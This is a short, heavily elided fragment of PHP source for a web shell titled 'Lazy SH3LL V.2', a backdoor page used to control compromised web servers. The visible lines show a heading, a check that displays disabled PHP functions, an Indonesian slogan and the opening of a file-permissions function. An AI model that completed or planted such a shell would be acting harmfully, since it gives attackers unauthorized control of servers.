...
<body>
<h1><center><font color="red" face="">Lazy SH3LL V.2</font></center></h1>
...
$show_ds = (!empty($ds)) ? "<font color=red>$ds</font>" : "<font color=lime>Bersih Njeng!</font>";
...
echo '<center><br/>Awali Pagimu Dengan Minum TEH</center>
</body>
</html>';
function perms($file){
